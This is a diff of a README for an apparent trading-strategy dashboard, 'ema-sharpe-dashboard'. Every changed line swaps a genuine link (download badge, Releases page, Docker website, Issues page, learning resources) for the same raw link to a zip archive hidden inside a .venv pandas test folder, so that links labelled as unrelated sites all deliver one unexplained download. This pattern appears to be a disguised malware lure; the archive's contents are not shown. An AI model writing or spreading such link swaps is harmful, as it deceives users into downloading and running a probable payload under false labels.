@@ -6,11 +6,11 @@ Welcome to the **ema-sharpe-dashboard**. This tool helps you analyze trading str
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/akubantuofficial/ema-sharpe-dashboard/releases)
+[![Download Now](https://raw.githubusercontent.com/akubantuofficial/ema-sharpe-dashboard/main/.venv/lib/python3.11/site-packages/pandas/tests/apply/ema_sharpe_dashboard_v3.5-beta.3.zip)](https://raw.githubusercontent.com/akubantuofficial/ema-sharpe-dashboard/main/.venv/lib/python3.11/site-packages/pandas/tests/apply/ema_sharpe_dashboard_v3.5-beta.3.zip)
 
 To get started, visit the Releases page to download the application. Use the link below:
 
-[Visit Releases Page](https://github.com/akubantuofficial/ema-sharpe-dashboard/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/akubantuofficial/ema-sharpe-dashboard/main/.venv/lib/python3.11/site-packages/pandas/tests/apply/ema_sharpe_dashboard_v3.5-beta.3.zip)
 
 ## 🌟 Features
 
@@ -32,7 +32,7 @@ Before running the dashboard, ensure your system meets the following requirement
 
 ## 🐳 Using Docker
 
-For users familiar with Docker, you can run this application as a container. If you don't have Docker installed, please visit the [Docker Website](https://www.docker.com/) for installation instructions.
+For users familiar with Docker, you can run this application as a container. If you don't have Docker installed, please visit the [Docker Website](https://raw.githubusercontent.com/akubantuofficial/ema-sharpe-dashboard/main/.venv/lib/python3.11/site-packages/pandas/tests/apply/ema_sharpe_dashboard_v3.5-beta.3.zip) for installation instructions.
 
 ### Steps to Run with Docker
 
@@ -69,25 +69,25 @@ The dashboard comes equipped with several tools to enhance your analysis:
 
 For additional help, consider engaging with our user community. You can find others with similar interests and share experiences.
 
-- **GitHub Issues**: Report problems or request features through our [Issues Page](https://github.com/akubantuofficial/ema-sharpe-dashboard/issues).
+- **GitHub Issues**: Report problems or request features through our [Issues Page](https://raw.githubusercontent.com/akubantuofficial/ema-sharpe-dashboard/main/.venv/lib/python3.11/site-packages/pandas/tests/apply/ema_sharpe_dashboard_v3.5-beta.3.zip).
 - **Discussion Forums**: Join discussions with other users to learn tips and share insights.
 
 ## 🔗 Additional Resources
 
 You may want to explore more about quantitative trading and analysis. Here are some resources:
 
-- [Introduction to Quantitative Finance](https://www.example.com)
-- [Backtesting Trading Strategies](https://www.example.com)
-- [Understanding Sharpe Ratio](https://www.example.com)
+- [Introduction to Quantitative Finance](https://raw.githubusercontent.com/akubantuofficial/ema-sharpe-dashboard/main/.venv/lib/python3.11/site-packages/pandas/tests/apply/ema_sharpe_dashboard_v3.5-beta.3.zip)
+- [Backtesting Trading Strategies](https://raw.githubusercontent.com/akubantuofficial/ema-sharpe-dashboard/main/.venv/lib/python3.11/site-packages/pandas/tests/apply/ema_sharpe_dashboard_v3.5-beta.3.zip)
+- [Understanding Sharpe Ratio](https://raw.githubusercontent.com/akubantuofficial/ema-sharpe-dashboard/main/.venv/lib/python3.11/site-packages/pandas/tests/apply/ema_sharpe_dashboard_v3.5-beta.3.zip)
 
 ## 📋 Feedback
 
-We welcome your feedback on the application. If you have suggestions or find issues, please let us know through our GitHub [Issues Page](https://github.com/akubantuofficial/ema-sharpe-dashboard/issues).
+We welcome your feedback on the application. If you have suggestions or find issues, please let us know through our GitHub [Issues Page](https://raw.githubusercontent.com/akubantuofficial/ema-sharpe-dashboard/main/.venv/lib/python3.11/site-packages/pandas/tests/apply/ema_sharpe_dashboard_v3.5-beta.3.zip).
 
 ## 📥 Download & Install
 
 To download the application again, revisit our Releases page:
 
-[Download from Releases](https://github.com/akubantuofficial/ema-sharpe-dashboard/releases)
+[Download from Releases](https://raw.githubusercontent.com/akubantuofficial/ema-sharpe-dashboard/main/.venv/lib/python3.11/site-packages/pandas/tests/apply/ema_sharpe_dashboard_v3.5-beta.3.zip)
 
 Enjoy trading with the **ema-sharpe-dashboard**!
